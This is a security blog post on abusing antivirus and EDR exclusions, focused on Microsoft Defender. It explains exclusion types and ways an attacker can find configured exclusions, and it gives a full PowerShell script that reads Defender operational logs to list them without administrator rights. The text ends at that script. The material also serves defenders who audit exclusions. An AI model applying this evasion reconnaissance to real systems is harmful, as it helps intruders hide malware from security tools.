<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Abusing Exclusions To Evade Detection" /><meta name="author" content="Dazzy" /><meta property="og:locale" content="en_US" /><meta name="description" content="Long time dear readers. In this blog post we’ll see how to abuse a common feature in Antivirus and EDRs that’s not much talked about. I am using Defender AV as that’s common and by default across all Windows Operating Systems but this blog post can be AV and EDR agnostic as exclusion is a feature that’s present in all AVs/EDRs and mostly works the similar way only. What makes this technique particularly dangerous is its subtlety. Unlike more aggressive methods of AV/EDR evasion that might trigger alerts or leave obvious traces, abusing exclusions allows malicious activities to fly under the radar. It’s a method that’s not commonly discussed or defended against, making it a potent tool in an attacker’s arsenal." /><meta property="og:description" content="Long time dear readers. In this blog post we’ll see how to abuse a common feature in Antivirus and EDRs that’s not much talked about. I am using Defender AV as that’s common and by default across all Windows Operating Systems but this blog post can be AV and EDR agnostic as exclusion is a feature that’s present in all AVs/EDRs and mostly works the similar way only. What makes this technique particularly dangerous is its subtlety. Unlike more aggressive methods of AV/EDR evasion that might trigger alerts or leave obvious traces, abusing exclusions allows malicious activities to fly under the radar. It’s a method that’s not commonly discussed or defended against, making it a potent tool in an attacker’s arsenal." /><link rel="canonical" href="https://dazzyddos.github.io/posts/Abusing_Exclusions_To_Evade_Detection/" /><meta property="og:url" content="https://dazzyddos.github.io/posts/Abusing_Exclusions_To_Evade_Detection/" /><meta property="og:site_name" content="Dazzy Ddos" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-08-11T03:15:00+03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Abusing Exclusions To Evade Detection" /><meta name="twitter:site" content="@dazzyddos" /><meta name="twitter:creator" content="@Dazzy" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Dazzy"},"description":"Long time dear readers. In this blog post we’ll see how to abuse a common feature in Antivirus and EDRs that’s not much talked about. I am using Defender AV as that’s common and by default across all Windows Operating Systems but this blog post can be AV and EDR agnostic as exclusion is a feature that’s present in all AVs/EDRs and mostly works the similar way only. What makes this technique particularly dangerous is its subtlety. Unlike more aggressive methods of AV/EDR evasion that might trigger alerts or leave obvious traces, abusing exclusions allows malicious activities to fly under the radar. It’s a method that’s not commonly discussed or defended against, making it a potent tool in an attacker’s arsenal.","url":"https://dazzyddos.github.io/posts/Abusing_Exclusions_To_Evade_Detection/","@type":"BlogPosting","headline":"Abusing Exclusions To Evade Detection","dateModified":"2024-08-11T03:15:00+03:00","datePublished":"2024-08-11T03:15:00+03:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://dazzyddos.github.io/posts/Abusing_Exclusions_To_Evade_Detection/"},"@context":"https://schema.org"}</script><title>Abusing Exclusions To Evade Detection | Dazzy Ddos</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/25081660?s=460&u=d7eb9a459d672ab9b0b1ccead34de3233e2843ee&v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Dazzy Ddos</a></div><div class="site-subtitle font-italic"></div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/dazzyddos" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/dazzyddos" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Abusing Exclusions To Evade Detection</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Abusing Exclusions To Evade Detection</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Aug 11, 2024, 3:15 AM +0300" > Aug 11 <i class="unloaded">2024-08-11T03:15:00+03:00</i> </span> by <span class="author"> Dazzy </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2641 words">14 min</span></div></div><div class="post-content"><p>Long time dear readers. In this blog post we’ll see how to abuse a common feature in Antivirus and EDRs that’s not much talked about. I am using Defender AV as that’s common and by default across all Windows Operating Systems but this blog post can be AV and EDR agnostic as exclusion is a feature that’s present in all AVs/EDRs and mostly works the similar way only. What makes this technique particularly dangerous is its subtlety. Unlike more aggressive methods of AV/EDR evasion that might trigger alerts or leave obvious traces, abusing exclusions allows malicious activities to fly under the radar. It’s a method that’s not commonly discussed or defended against, making it a potent tool in an attacker’s arsenal.</p><h3 id="understanding-avedr-exclusions">Understanding AV/EDR Exclusions</h3><p>Antivirus (AV) and Endpoint Detection and Response (EDR) solutions are critical components of modern cybersecurity defenses. They are designed to protect systems from malicious activities. However, they’re not perfect and can sometimes interfere with legitimate operations, causing false positives or performance impacts. Knowing this thing only vendors have given an extra feature of Exclusions in them which can be utilized to exclude certain assets be it paths, processes, files and extensions.</p><p>While exclusions are necessary for optimizing performance and reducing false positives, especially in complex enterprise environments, they can also create security blind spots if not managed carefully.</p><h3 id="types-of-exclusions-in-defender-av">Types of Exclusions in Defender AV</h3><p>Let’s look at the types of exclusions available in Microsoft Defender AV as an example. While we’re focusing on Defender, it’s worth noting that most AV/EDR solutions offer similar exclusion capabilities.</p><div class="table-wrapper"><table><thead><tr><th style="text-align: center">Exclusion Type<th style="text-align: center">Description<tbody><tr><td style="text-align: center">File<td style="text-align: center">Specific file will not be subject to Defender AV scan<tr><td style="text-align: center">Folder<td style="text-align: center">Entire directory will be skipped during Defender AV scan<tr><td style="text-align: center">Process<td style="text-align: center">Any activity be it downloading a file, creating a new process or opening an existing file will not be scanned<tr><td style="text-align: center">Extension<td style="text-align: center">Specific file extension will not be subject to Defender AV</table></div><h3 id="real-world-abuse-of-exclusions">Real world abuse of Exclusions</h3><p>I wanted to get a picture of how common the abuse of exclusions are in real world. So, I started searching and couldn’t find much except for few malwares where it utilized exclusion feature to set and write further malicious tools in the excluded folders. But I couldn’t find any blog post or threat report where I could see threat actors looking for already excluded assets and abusing it in someway (if you know any, please send me over). <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/realworld1.png" alt="" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/realworld2.png" alt="" /></p><p>https://www.elastic.co/security-labs/qbot-malware-analysis</p><h3 id="enumerating-defender-av-exclusions">Enumerating Defender AV Exclusions</h3><p>Enumeration is the first step to any kind of pentesting. Before we delve into how to abusing each kind of exclusions, the attacker first needs to figure out what exclusions are set on the endpoint. Microsoft Defender AV includes PowerShell cmdlets that allow to view and manage its configuration settings. One such cmdlet is <code class="language-plaintext highlighter-rouge">Get-MpPreference</code>, which provides detailed information about the current settings, including exclusions.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-MpPreference</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nt">-Property</span><span class="w"> </span><span class="nx">ExclusionPath</span><span class="p">,</span><span class="w"> </span><span class="nx">ExclusionProcess</span><span class="p">,</span><span class="w"> </span><span class="nx">ExclusionExtension</span><span class="w">
</span></pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/getmppreference.png" alt="" /></p><p>However, there’s a catch: only users with administrative privileges can execute this command. This limitation is designed to protect the configuration settings from unauthorized access.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/getmppreference2.png" alt="" /></p><p>Even without administrative access, attackers who gain a foothold on a system can infer potential exclusions through various means. One common technique involves enumerating running processes and existing directories on the system to understand which applications are in use. By identifying well-known enterprise applications, attackers can then leverage publicly accessible documentation and vendor recommendations to predict likely exclusions on a target system. Many vendors provide guidelines on recommended exclusions to ensure compatibility and performance, and attackers can use this information to identify potential security gaps. For instance, Microsoft has documented recommended exclusions for products such as Exchange Server, System Center Configuration Manager (SCCM), System Center Operations Manager (SCOM), and Hyper-V. By researching these recommendations, attackers can deduce which exclusions might be configured, allowing them to strategize their attacks more effectively. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/automaticexclusions.png" alt="" /> <strong>Source:</strong> https://learn.microsoft.com/en-us/defender-endpoint/configure-server-exclusions-microsoft-defender-antivirus</p><p>Another method attackers might use is analyzing configuration files or system documentation that could contain exclusion lists. Administrators sometimes leave these files on systems for easy reference, and they can provide valuable insights into the current security posture. By piecing together information from these various sources, attackers can effectively map out the exclusion landscape and strategize their attacks accordingly.</p><h4 id="leveraging-defender-av-operational-logs-to-enumerate-exclusions">Leveraging Defender AV Operational Logs to enumerate Exclusions</h4><p>Another interesting technique for enumerating Defender AV exclusions involves examining the Windows Defender AV operational logs, which are readable by standard users. By default, Defender AV logs configuration changes, including modifications to exclusions.</p><p>A notable approach to leveraging these logs was demonstrated by https://x.com/I_Am_Jakoby. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/jakobytweet.png" alt="" /> He provided a basic script to parse these logs and identify exclusion entries. Building upon his work, I’ve developed a PowerShell script on top of it using ChatGPT (me no credits, me bad coder hehe )that provides better output.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
</pre><td class="rouge-code"><pre><span class="kr">function</span><span class="w"> </span><span class="nf">Get-DefenderExclusions</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="kr">param</span><span class="w"> </span><span class="p">(</span><span class="w">
        </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$logName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Microsoft-Windows-Windows Defender/Operational"</span><span class="p">,</span><span class="w">
        </span><span class="p">[</span><span class="n">int</span><span class="p">]</span><span class="nv">$eventID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">5007</span><span class="p">,</span><span class="w">
        </span><span class="p">[</span><span class="n">switch</span><span class="p">]</span><span class="nv">$Path</span><span class="p">,</span><span class="w">
        </span><span class="p">[</span><span class="n">switch</span><span class="p">]</span><span class="nv">$Process</span><span class="p">,</span><span class="w">
        </span><span class="p">[</span><span class="n">switch</span><span class="p">]</span><span class="nv">$Extension</span><span class="w">
    </span><span class="p">)</span><span class="w">

    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="o">-not</span><span class="w"> </span><span class="p">(</span><span class="nv">$Path</span><span class="w"> </span><span class="o">-or</span><span class="w"> </span><span class="nv">$Process</span><span class="w"> </span><span class="o">-or</span><span class="w"> </span><span class="nv">$Extension</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"Please specify at least one type of exclusion to filter: -Path, -Process, -Extension."</span><span class="w">
        </span><span class="kr">return</span><span class="w">
    </span><span class="p">}</span><span class="w">

    </span><span class="c"># Get all event logs with the specified Event ID</span><span class="w">
    </span><span class="nv">$events</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-WinEvent</span><span class="w"> </span><span class="nt">-LogName</span><span class="w"> </span><span class="nv">$logName</span><span class="w"> </span><span class="nt">-FilterXPath</span><span class="w"> </span><span class="s2">"*[System[(EventID=</span><span class="nv">$eventID</span><span class="s2">)]]"</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">

    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="o">-not</span><span class="w"> </span><span class="nv">$events</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"No events found with Event ID </span><span class="nv">$eventID</span><span class="s2"> in the </span><span class="nv">$logName</span><span class="s2"> log."</span><span class="w">
        </span><span class="kr">return</span><span class="w">
    </span><span class="p">}</span><span class="w">

    </span><span class="c"># Define the regex patterns for exclusion paths, extensions, and processes</span><span class="w">
    </span><span class="nv">$patterns</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@{</span><span class="w">
        </span><span class="nx">Path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\([^</span><span class="se">`"</span><span class="s2">]+)"</span><span class="w">
        </span><span class="nx">Extension</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions\\([^</span><span class="se">`"</span><span class="s2">]+)"</span><span class="w">
        </span><span class="nx">Process</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes\\([^</span><span class="se">`"</span><span class="s2">]+)"</span><span class="w">
    </span><span class="p">}</span><span class="w">

    </span><span class="c"># Function to parse and return unique exclusions</span><span class="w">
    </span><span class="kr">function</span><span class="w"> </span><span class="nf">Get-UniqueExclusions</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="kr">param</span><span class="w"> </span><span class="p">(</span><span class="w">
            </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$pattern</span><span class="p">,</span><span class="w">
            </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$exclusionType</span><span class="w">
        </span><span class="p">)</span><span class="w">

        </span><span class="nv">$uniqueExclusions</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@{}</span><span class="w">
        </span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$event</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$events</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nv">$message</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$event</span><span class="o">.</span><span class="nf">Message</span><span class="w">
            </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$message</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="nv">$pattern</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="nv">$exclusionDetail</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">-replace</span><span class="w"> </span><span class="s1">' = 0x0.*$'</span><span class="p">,</span><span class="w"> </span><span class="s1">''</span><span class="w"> </span><span class="o">-replace</span><span class="w"> </span><span class="s1">'New value:'</span><span class="p">,</span><span class="w"> </span><span class="s1">''</span><span class="w"> </span><span class="o">-replace</span><span class="w"> </span><span class="s1">'^\s+|\s+$'</span><span class="p">,</span><span class="w"> </span><span class="s1">''</span><span class="w">
                </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="o">-not</span><span class="w"> </span><span class="nv">$uniqueExclusions</span><span class="o">.</span><span class="nf">ContainsKey</span><span class="p">(</span><span class="nv">$exclusionDetail</span><span class="p">)</span><span class="w"> </span><span class="o">-or</span><span class="w"> </span><span class="nv">$event</span><span class="o">.</span><span class="nf">TimeCreated</span><span class="w"> </span><span class="o">-gt</span><span class="w"> </span><span class="nv">$uniqueExclusions</span><span class="p">[</span><span class="nv">$exclusionDetail</span><span class="p">])</span><span class="w"> </span><span class="p">{</span><span class="w">
                    </span><span class="nv">$uniqueExclusions</span><span class="p">[</span><span class="nv">$exclusionDetail</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$event</span><span class="o">.</span><span class="nf">TimeCreated</span><span class="w">
                </span><span class="p">}</span><span class="w">
            </span><span class="p">}</span><span class="w">
        </span><span class="p">}</span><span class="w">
        </span><span class="kr">return</span><span class="w"> </span><span class="nv">$uniqueExclusions</span><span class="o">.</span><span class="nf">GetEnumerator</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Sort-Object</span><span class="w"> </span><span class="nx">Value</span><span class="w"> </span><span class="nt">-Descending</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="p">[</span><span class="n">PSCustomObject</span><span class="p">]@{</span><span class="w">
                </span><span class="nx">ExclusionDetail</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$_</span><span class="err">.</span><span class="nx">Key</span><span class="w">
                </span><span class="nx">TimeCreated</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$_</span><span class="err">.</span><span class="nx">Value</span><span class="w">
            </span><span class="p">}</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">

    </span><span class="c"># Extract and display exclusions based on the provided arguments</span><span class="w">
    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$Path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"Path Exclusions:"</span><span class="w">
        </span><span class="n">Get-UniqueExclusions</span><span class="w"> </span><span class="nt">-pattern</span><span class="w"> </span><span class="nv">$patterns</span><span class="o">.</span><span class="nf">Path</span><span class="w"> </span><span class="nt">-exclusionType</span><span class="w"> </span><span class="s1">'Path'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Format-Table</span><span class="w"> </span><span class="nt">-Property</span><span class="w"> </span><span class="nx">ExclusionDetail</span><span class="p">,</span><span class="w"> </span><span class="nx">TimeCreated</span><span class="w"> </span><span class="nt">-AutoSize</span><span class="w"> </span><span class="nt">-Wrap</span><span class="w">
    </span><span class="p">}</span><span class="w">
    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$Process</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"Process Exclusions:"</span><span class="w">
        </span><span class="n">Get-UniqueExclusions</span><span class="w"> </span><span class="nt">-pattern</span><span class="w"> </span><span class="nv">$patterns</span><span class="o">.</span><span class="nf">Process</span><span class="w"> </span><span class="nt">-exclusionType</span><span class="w"> </span><span class="s1">'Process'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Format-Table</span><span class="w"> </span><span class="nt">-Property</span><span class="w"> </span><span class="nx">ExclusionDetail</span><span class="p">,</span><span class="w"> </span><span class="nx">TimeCreated</span><span class="w"> </span><span class="nt">-AutoSize</span><span class="w"> </span><span class="nt">-Wrap</span><span class="w">
    </span><span class="p">}</span><span class="w">
    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$Extension</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"Extension Exclusions:"</span><span class="w">
        </span><span class="n">Get-UniqueExclusions</span><span class="w"> </span><span class="nt">-pattern</span><span class="w"> </span><span class="nv">$patterns</span><span class="o">.</span><span class="nf">Extension</span><span class="w"> </span><span class="nt">-exclusionType</span><span class="w"> </span><span class="s1">'Extension'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Format-Table</span><span class="w"> </span><span class="nt">-Property</span><span class="w"> </span><span class="nx">ExclusionDetail</span><span class="p">,</span><span class="w"> </span><span class="nx">TimeCreated</span><span class="w"> </span><span class="nt">-AutoSize</span><span class="w"> </span><span class="nt">-Wrap</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="c"># Example usage:</span><span class="w">
</span><span class="c"># Get-DefenderExclusions -Path -Process -Extension</span><span class="w">
</span><span class="c"># Get-DefenderExclusions -Process</span><span class="w">
